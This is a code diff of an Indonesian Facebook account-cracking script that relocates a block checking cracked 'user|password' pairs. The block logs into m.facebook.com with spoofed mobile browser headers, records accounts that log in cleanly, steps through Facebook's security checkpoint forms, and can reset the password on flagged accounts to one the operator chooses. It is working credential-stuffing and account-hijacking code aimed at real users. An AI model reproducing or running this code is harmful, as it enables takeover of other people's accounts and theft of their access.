@@ -1348,278 +1348,6 @@ def pilih_file(file_map, folder, warna_akun):
     console.input(f" {H2}• {P2}[ {M2}Klik Enter For Exit {P2}]")
     exit()
 
-
-# -----------------------[ DEF CEK OPSI ]--------------------#
-import requests, shutil, os, re, bs4, sys, json, time, platform, random, datetime, subprocess, logging, base64
-import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup as parser
-from threading import Thread, Event
-from time import sleep as jeda
-from time import sleep 
-from datetime import datetime
-from rich import print as prints
-from rich.panel import Panel
-from rich.console import Console
-console = Console()
-
-ct = datetime.now()
-n = ct.month
-bulan_ = [
-    "Januari",
-    "Februari",
-    "Maret",
-    "April",
-    "Mei",
-    "Juni",
-    "Juli",
-    "Agustus",
-    "September",
-    "Oktober",
-    "November",
-    "Desember",
-]
-try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
-
-current = datetime.now()
-hari = current.day
-bulan = bulan_[nTemp]
-tahun = current.year
-bullan = current.month
-day = datetime.now().strftime("%d-%b-%Y")
-
-M = "\x1b[1;91m"  # MERAH
-H = "\x1b[1;92m"  # HIJAU
-K = "\x1b[1;93m"  # KUNING
-B = "\x1b[1;94m"  # BIRU
-U = "\x1b[1;95m"  # UNGU
-O = "\x1b[1;96m"  # BIRU MUDA
-P = "\x1b[1;97m"  # PUTIH
-J = "\033[38;2;255;127;0;1m"  # ORANGE
-N = "\x1b[0m"  # WARNA MATI
-M2 = "[#FF0000]"  # MERAH
-H2 = "[#00FF00]"  # HIJAU
-K2 = "[#FFFF00]"  # KUNING
-B2 = "[#00C8FF]"  # BIRU
-P2 = "[#FFFFFF]"  # PUTIH
-U2 = "[#AF00FF]"  # UNGU
-O2 = "[#FF8F00]"  # ORANGE
-try:
-    file_color = open("data/theme_color", "r").read()
-    color_text = file_color.split("|")[0]
-    color_panel = file_color.split("|")[1]
-except:
-    color_text = "[#00FF00]"
-    W1 = random.choice([M2, H2, K2])
-    W2 = random.choice([K2, M2, K2])
-    W3 = random.choice([H2, K2, M2])
-    color_panel = "#00FF00"
-    color_ok = "#00FF00"
-    color_cp = "#FFFF00"
-try:
-    color_table = open("data/theme_color", "r").read()
-except FileNotFoundError:
-    color_table = "#00FF00"
-acak = [P]
-warna = random.choice(acak)
-til = "\033[0m [+] "
-
-
-def jalan(keliling):
-    for mau in keliling + "\n":
-        sys.stdout.write(mau)
-        sys.stdout.flush()
-        jeda(0.03)
-
-
-ubah_pass = []
-pwbaru = []
-pwBaru = []
-ubahP = []
-
-def file_cp():
-    try:
-        dirs = os.listdir("CP")
-        if not dirs:
-            prints(Panel(f"{P2}Tidak Ada File Untuk Diperiksa, Silakan Crack Dulu.", width=60, style=color_panel))
-            sys.exit()
-        
-        panel_content = "\n".join([f"{P2}[{color_text}{i}{P2}].{file}" for i, file in enumerate(dirs, start=1)])
-        panel_content += f"\n{P2}[{color_text}0{P2}].Semua File"
-        prints(Panel(panel_content, width=60, style=color_panel, title=f"{H2}Pilih File untuk Diperiksa"))
-
-        pilihan = console.input(f"{H2} >{P2} Masukan : ")
-        if pilihan == "0":
-            file_list = dirs  # Pilih semua file
-        else:
-            try:
-                pilihan = int(pilihan)
-                if 1 <= pilihan <= len(dirs):
-                    file_list = [dirs[pilihan - 1]]  # Pilih file berdasarkan nomor
-                else:
-                    console.print(Panel(f"{H2} > {P2}Pilihan tidak valid!", width=60,style=color_panel))
-                    return file_cp()
-            except ValueError:
-                console.print(Panel(f"{H2} > {P2}Masukkan angka yang benar!", width=60,style=color_panel))
-                return file_cp()
-
-        opsi(file_list)  # Kirim daftar file ke opsi()
-    except FileNotFoundError:
-        console.print(Panel(f"{H2} > {P2}Folder 'CP' tidak ditemukan!",width=60, style=color_panel))
-        sys.exit()
-
-
-     
-def opsi(file_list):  # Perbaikan fungsi opsi agar menerima file_list
-    for file in file_list:
-        CP = f"CP/{file}"
-        try:
-            file_cp = open(CP, "r").readlines()
-        except IOError:
-            console.print(Panel(f"{H2} > {P2}Nama file {file} tidak tersedia!", width=60,style=color_panel))
-            continue  # Lewati file yang tidak bisa dibuka
-            
-        console.print(f"{H2} > {P2}Memeriksa file:{H2} {file}{P2}")
-        console.print(f"{H2} > {P2}Mode pesawat dulu {K2}5{P2} detik.")
-        
-        pw = console.input(f"{H2} > {P2}Ubah Sandi Pada Akun One Tab?{H2} y{P2}/{K2}t{P2} : ")
-        if pw in ["y", "Y"]:
-            ubah_pass.append("ubah_sandi")
-            pw2 = console.input(f"{H2} > {P2}Masukan Sandi : ")
-            if len(pw2) <= 5:
-                console.print(f"{H2} > {M2}Sandi Minimal 6 Karakter!")
-                continue
-            pwbaru.append(pw2)
-
-        console.print(f"{H2} > {P2}Total Akun : {H2}%s {P2}" % (str(len(file_cp))))
-        nomor = 0
-        for fb in file_cp:
-            akun = fb.replace("\n", "")
-            ngecek = akun.split("|")
-            nomor += 1
-            console.print(f"\n%s{H2}.{P2}Login Akun {H2}> {K2}%s" % (str(nomor), akun.replace(" *--> ", "")))
-            jeda(0.07)
-            try:
-                mengecek(ngecek[0], ngecek[1])
-            except requests.exceptions.ConnectionError:
-                continue
-
-    console.print(Panel(f"{H2} > {P2}Selesai Mengecek Akun", width=60,style=color_panel))
-    sys.exit()
-
-
-data = {}
-data2 = {}
-
-def kontolll():
- rr = random.randint
- rc = random.choice
- konton = f"Mozilla/5.0 (Linux; Android 11; {str(rr(3,9))}.{str(rr(0,1))}.1; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
- return random.choice([konton])
-
-import requests
-import re
-from bs4 import BeautifulSoup
-
-def mengecek(user, pw):
-    global loop, ubah_pass, pwbaru
-
-    # Inisialisasi sesi
-    session = requests.Session()
-    url = "https://m.facebook.com"
-    session.headers.update({
-        "Host": "m.facebook.com",
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-        "accept-encoding": "gzip, deflate",
-        "accept-language": "id-ID,id;q=0.9",
-        "referer": "https://mbasic.facebook.com/",
-        "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
-    })
-
-    try:
-        # Ambil halaman login awal
-        soup = BeautifulSoup(session.get(f"{url}/login/?next&ref=dbl&fl&refid=8").text, "html.parser")
-        link = soup.find("form", {"method": "post"})
-
-        # Ambil semua input form
-        data = {}
-        for x in soup.find_all("input"):
-            if x.get("name"):
-                data[x.get("name")] = x.get("value")
-        data.update({"email": user, "pass": pw})
-
-        # Kirim permintaan login
-        urlPost = session.post(url + link.get("action"), data=data)
-        response = BeautifulSoup(urlPost.text, "html.parser")
-
-        # Cek status login
-        cookies = session.cookies.get_dict()
-        if "c_user" in cookies:
-            if "Akun Anda Dikunci" in urlPost.text:
-                console.print(f"\r{H2} > {P2}Akun Tidak Terkunci Sesi")
-            else:
-                console.print(f"\r{H2} > {P2}Akun Tidak Checkpoint, Silahkan Login")
-                open(f'OK/OK-{waktu}.txt', 'a').write(" %s|%s\n" % (user, pw))
-
-        elif "checkpoint" in cookies:
-            coki = ";".join([f"{key}={value}" for key, value in cookies.items()])
-            title = response.title.string
-            link2 = response.find("form", {"method": "post"})
-            data2 = {}
-
-            # Ambil input untuk form checkpoint
-            listInput = ['fb_dtsg', 'jazoest', 'checkpoint_data', 'submit[Continue]', 'nh']
-            for x in response.find_all("input"):
-                if x.get("name") in listInput:
-                    data2[x.get("name")] = x.get("value")
-
-            an = session.post(url + link2.get("action"), data=data2)
-            response2 = BeautifulSoup(an.text, "html.parser")
-            cek = [cek.text for cek in response2.find_all("option")]
-
-            console.print(f"\r{H2} > {P2}terdapat %s opsi:" % (len(cek)))
-            if len(cek) == 0:
-                if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
-                    if "ubah_sandi" in ubah_pass:
-                        # Ubah sandi jika diizinkan
-                        dat, dat2 = {}, {}
-                        but = ["submit[Yes]", "nh", "fb_dtsg", "jazoest", "checkpoint_data"]
-                        for x in response.find_all("input"):
-                            if x.get("name") in but:
-                                dat[x.get("name")] = x.get("value")
-                        ubahPw = session.post(url + link2.get("action"), data=dat).text
-                        resUbah = BeautifulSoup(ubahPw, "html.parser")
-                        link3 = resUbah.find("form", {"method": "post"})
-                        if "Buat Kata Sandi Baru" in resUbah.title.string:
-                            for b in resUbah.find_all("input"):
-                                dat2[b.get("name")] = b.get("value")
-                            dat2["password_new"] = "".join(pwbaru)
-                            session.post(url + link3.get("action"), data=dat2)
-                            console.print(f"\r{H2} > {P2}Akun One Tab, Sandi Berhasil Diubah")
-                    else:
-                        console.print(f"\r{H2} > {P2}Akun One Tab, Silahkan Login")
-                elif "Masukkan Kode Masuk untuk Melanjutkan" in title:
-                    console.print(f"\r{H2} > {P2}Akun Menggunakan Autentikasi Dua Faktor")
-            for opsi, teks in enumerate(cek, start=1):
-                console.print(f"{H2} > {P2}{opsi}. {teks}")
-
-        elif "login_error" in response.text:
-            oh = response.find("div", {"id": "login_error"}).find("div").text
-            console.print(f"{H2} > {P2} {oh}")
-        else:
-            console.print(f"{H2} > {P2}Login Gagal, Silahkan Cek Kembali ID dan Kata Sandi")
-
-    except requests.exceptions.RequestException as e:
-        console.print(f"{H2} > {P2}Error koneksi:[/bold red] {e}")
-    except Exception as e:
-        console.print(f"{H2} > {P2}Kesalahan tidak terduga:[/bold red] {e}")
-
-
 def convert(cookie):
     cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
         cookie["fr"],
@@ -2302,6 +2030,278 @@ def fannky_b_api(idf, pwv):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
+
+
+
+# -----------------------[ DEF CEK OPSI ]--------------------#
+import requests, shutil, os, re, bs4, sys, json, time, platform, random, datetime, subprocess, logging, base64
+import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
+from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup as parser
+from threading import Thread, Event
+from time import sleep as jeda
+from time import sleep 
+from datetime import datetime
+from rich import print as prints
+from rich.panel import Panel
+from rich.console import Console
+console = Console()
+
+ct = datetime.now()
+n = ct.month
+bulan_ = [
+    "Januari",
+    "Februari",
+    "Maret",
+    "April",
+    "Mei",
+    "Juni",
+    "Juli",
+    "Agustus",
+    "September",
+    "Oktober",
+    "November",
+    "Desember",
+]
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+hari = current.day
+bulan = bulan_[nTemp]
+tahun = current.year
+bullan = current.month
+day = datetime.now().strftime("%d-%b-%Y")
+
+M = "\x1b[1;91m"  # MERAH
+H = "\x1b[1;92m"  # HIJAU
+K = "\x1b[1;93m"  # KUNING
+B = "\x1b[1;94m"  # BIRU
+U = "\x1b[1;95m"  # UNGU
+O = "\x1b[1;96m"  # BIRU MUDA
+P = "\x1b[1;97m"  # PUTIH
+J = "\033[38;2;255;127;0;1m"  # ORANGE
+N = "\x1b[0m"  # WARNA MATI
+M2 = "[#FF0000]"  # MERAH
+H2 = "[#00FF00]"  # HIJAU
+K2 = "[#FFFF00]"  # KUNING
+B2 = "[#00C8FF]"  # BIRU
+P2 = "[#FFFFFF]"  # PUTIH
+U2 = "[#AF00FF]"  # UNGU
+O2 = "[#FF8F00]"  # ORANGE
+try:
+    file_color = open("data/theme_color", "r").read()
+    color_text = file_color.split("|")[0]
+    color_panel = file_color.split("|")[1]
+except:
+    color_text = "[#00FF00]"
+    W1 = random.choice([M2, H2, K2])
+    W2 = random.choice([K2, M2, K2])
+    W3 = random.choice([H2, K2, M2])
+    color_panel = "#00FF00"
+    color_ok = "#00FF00"
+    color_cp = "#FFFF00"
+try:
+    color_table = open("data/theme_color", "r").read()
+except FileNotFoundError:
+    color_table = "#00FF00"
+acak = [P]
+warna = random.choice(acak)
+til = "\033[0m [+] "
+
+
+def jalan(keliling):
+    for mau in keliling + "\n":
+        sys.stdout.write(mau)
+        sys.stdout.flush()
+        jeda(0.03)
+
+
+ubah_pass = []
+pwbaru = []
+pwBaru = []
+ubahP = []
+
+def file_cp():
+    try:
+        dirs = os.listdir("CP")
+        if not dirs:
+            prints(Panel(f"{P2}Tidak Ada File Untuk Diperiksa, Silakan Crack Dulu.", width=60, style=color_panel))
+            sys.exit()
+        
+        panel_content = "\n".join([f"{P2}[{color_text}{i}{P2}].{file}" for i, file in enumerate(dirs, start=1)])
+        panel_content += f"\n{P2}[{color_text}0{P2}].Semua File"
+        prints(Panel(panel_content, width=60, style=color_panel, title=f"{H2}Pilih File untuk Diperiksa"))
+
+        pilihan = console.input(f"{H2} >{P2} Masukan : ")
+        if pilihan == "0":
+            file_list = dirs  # Pilih semua file
+        else:
+            try:
+                pilihan = int(pilihan)
+                if 1 <= pilihan <= len(dirs):
+                    file_list = [dirs[pilihan - 1]]  # Pilih file berdasarkan nomor
+                else:
+                    console.print(Panel(f"{H2} > {P2}Pilihan tidak valid!", width=60,style=color_panel))
+                    return file_cp()
+            except ValueError:
+                console.print(Panel(f"{H2} > {P2}Masukkan angka yang benar!", width=60,style=color_panel))
+                return file_cp()
+
+        opsi(file_list)  # Kirim daftar file ke opsi()
+    except FileNotFoundError:
+        console.print(Panel(f"{H2} > {P2}Folder 'CP' tidak ditemukan!",width=60, style=color_panel))
+        sys.exit()
+
+
+     
+def opsi(file_list):  # Perbaikan fungsi opsi agar menerima file_list
+    for file in file_list:
+        CP = f"CP/{file}"
+        try:
+            file_cp = open(CP, "r").readlines()
+        except IOError:
+            console.print(Panel(f"{H2} > {P2}Nama file {file} tidak tersedia!", width=60,style=color_panel))
+            continue  # Lewati file yang tidak bisa dibuka
+            
+        console.print(f"{H2} > {P2}Memeriksa file:{H2} {file}{P2}")
+        console.print(f"{H2} > {P2}Mode pesawat dulu {K2}5{P2} detik.")
+        
+        pw = console.input(f"{H2} > {P2}Ubah Sandi Pada Akun One Tab?{H2} y{P2}/{K2}t{P2} : ")
+        if pw in ["y", "Y"]:
+            ubah_pass.append("ubah_sandi")
+            pw2 = console.input(f"{H2} > {P2}Masukan Sandi : ")
+            if len(pw2) <= 5:
+                console.print(f"{H2} > {M2}Sandi Minimal 6 Karakter!")
+                continue
+            pwbaru.append(pw2)
+
+        console.print(f"{H2} > {P2}Total Akun : {H2}%s {P2}" % (str(len(file_cp))))
+        nomor = 0
+        for fb in file_cp:
+            akun = fb.replace("\n", "")
+            ngecek = akun.split("|")
+            nomor += 1
+            console.print(f"\n%s{H2}.{P2}Login Akun {H2}> {K2}%s" % (str(nomor), akun.replace(" *--> ", "")))
+            jeda(0.07)
+            try:
+                mengecek(ngecek[0], ngecek[1])
+            except requests.exceptions.ConnectionError:
+                continue
+
+    console.print(Panel(f"{H2} > {P2}Selesai Mengecek Akun", width=60,style=color_panel))
+    sys.exit()
+
+
+data = {}
+data2 = {}
+
+def kontolll():
+ rr = random.randint
+ rc = random.choice
+ konton = f"Mozilla/5.0 (Linux; Android 11; {str(rr(3,9))}.{str(rr(0,1))}.1; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2300,2900))}.{str(rr(75,150))} Mobile Safari/537.36"
+ return random.choice([konton])
+
+import requests
+import re
+from bs4 import BeautifulSoup
+
+def mengecek(user, pw):
+    global loop, ubah_pass, pwbaru
+
+    # Inisialisasi sesi
+    session = requests.Session()
+    url = "https://m.facebook.com"
+    session.headers.update({
+        "Host": "m.facebook.com",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "accept-encoding": "gzip, deflate",
+        "accept-language": "id-ID,id;q=0.9",
+        "referer": "https://mbasic.facebook.com/",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+    })
+
+    try:
+        # Ambil halaman login awal
+        soup = BeautifulSoup(session.get(f"{url}/login/?next&ref=dbl&fl&refid=8").text, "html.parser")
+        link = soup.find("form", {"method": "post"})
+
+        # Ambil semua input form
+        data = {}
+        for x in soup.find_all("input"):
+            if x.get("name"):
+                data[x.get("name")] = x.get("value")
+        data.update({"email": user, "pass": pw})
+
+        # Kirim permintaan login
+        urlPost = session.post(url + link.get("action"), data=data)
+        response = BeautifulSoup(urlPost.text, "html.parser")
+
+        # Cek status login
+        cookies = session.cookies.get_dict()
+        if "c_user" in cookies:
+            if "Akun Anda Dikunci" in urlPost.text:
+                console.print(f"\r{H2} > {P2}Akun Tidak Terkunci Sesi")
+            else:
+                console.print(f"\r{H2} > {P2}Akun Tidak Checkpoint, Silahkan Login")
+                open(f'OK/OK-{waktu}.txt', 'a').write(" %s|%s\n" % (user, pw))
+
+        elif "checkpoint" in cookies:
+            coki = ";".join([f"{key}={value}" for key, value in cookies.items()])
+            title = response.title.string
+            link2 = response.find("form", {"method": "post"})
+            data2 = {}
+
+            # Ambil input untuk form checkpoint
+            listInput = ['fb_dtsg', 'jazoest', 'checkpoint_data', 'submit[Continue]', 'nh']
+            for x in response.find_all("input"):
+                if x.get("name") in listInput:
+                    data2[x.get("name")] = x.get("value")
+
+            an = session.post(url + link2.get("action"), data=data2)
+            response2 = BeautifulSoup(an.text, "html.parser")
+            cek = [cek.text for cek in response2.find_all("option")]
+
+            console.print(f"\r{H2} > {P2}terdapat %s opsi:" % (len(cek)))
+            if len(cek) == 0:
+                if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
+                    if "ubah_sandi" in ubah_pass:
+                        # Ubah sandi jika diizinkan
+                        dat, dat2 = {}, {}
+                        but = ["submit[Yes]", "nh", "fb_dtsg", "jazoest", "checkpoint_data"]
+                        for x in response.find_all("input"):
+                            if x.get("name") in but:
+                                dat[x.get("name")] = x.get("value")
+                        ubahPw = session.post(url + link2.get("action"), data=dat).text
+                        resUbah = BeautifulSoup(ubahPw, "html.parser")
+                        link3 = resUbah.find("form", {"method": "post"})
+                        if "Buat Kata Sandi Baru" in resUbah.title.string:
+                            for b in resUbah.find_all("input"):
+                                dat2[b.get("name")] = b.get("value")
+                            dat2["password_new"] = "".join(pwbaru)
+                            session.post(url + link3.get("action"), data=dat2)
+                            console.print(f"\r{H2} > {P2}Akun One Tab, Sandi Berhasil Diubah")
+                    else:
+                        console.print(f"\r{H2} > {P2}Akun One Tab, Silahkan Login")
+                elif "Masukkan Kode Masuk untuk Melanjutkan" in title:
+                    console.print(f"\r{H2} > {P2}Akun Menggunakan Autentikasi Dua Faktor")
+            for opsi, teks in enumerate(cek, start=1):
+                console.print(f"{H2} > {P2}{opsi}. {teks}")
+
+        elif "login_error" in response.text:
+            oh = response.find("div", {"id": "login_error"}).find("div").text
+            console.print(f"{H2} > {P2} {oh}")
+        else:
+            console.print(f"{H2} > {P2}Login Gagal, Silahkan Cek Kembali ID dan Kata Sandi")
+
+    except requests.exceptions.RequestException as e:
+        console.print(f"{H2} > {P2}Error koneksi:[/bold red] {e}")
+    except Exception as e:
+        console.print(f"{H2} > {P2}Kesalahan tidak terduga:[/bold red] {e}")
 
 # -----------------------[ SYSTEM-CONTROL ]--------------------#
 if __name__ == "__main__":
